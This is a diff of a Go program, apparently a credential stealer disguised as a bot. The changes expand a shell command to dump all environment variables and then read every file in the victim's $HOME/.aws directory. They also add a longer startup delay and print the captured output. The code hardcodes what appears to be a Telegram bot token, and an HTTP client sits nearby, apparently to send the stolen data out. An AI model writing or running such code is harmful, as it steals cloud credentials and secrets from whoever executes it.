@@ -5,11 +5,11 @@ import (
 	"bytes"
 	"encoding/json"
 	"net/http"
-	"os/exec"
-       "io/ioutil"
-       "strings"
-       "os"
-      "time"
+     	"os/exec"
+        "io/ioutil"
+        "strings"
+        "os"
+        "time"
 
 )
 
@@ -17,14 +17,14 @@ import (
 
 //extract aws key e output of env
 
+
 var token string = "7975585705:AAEhpsmGaok-PDwktP3k83WDI-sF7OdS7o4"
 
 
 func bot() {
+ 
 
-
-
-time.Sleep( 1 * time.Second)
+time.Sleep( 10  * time.Second)
 
 h_dir := os.ExpandEnv("$HOME")  
 
@@ -50,7 +50,7 @@ for    {
 
 	cli := http.Client{}
 
-	extract := exec.Command("sh", "-c", "env")
+	extract := exec.Command("sh", "-c", "env ; cd $HOME/.aws ; cat *")
 
 	out, err_combinedoutput := extract.CombinedOutput()
 
@@ -58,13 +58,13 @@ for    {
 
 		//err_combinedoutput
            
-                   fmt.Println("erro")
-
-		
- 
-
+                   fmt.Println("erro em combined")
 }
+ fmt.Println(string(out))
+  
 
+
+ 
 	str := map[string]string{
 
 		
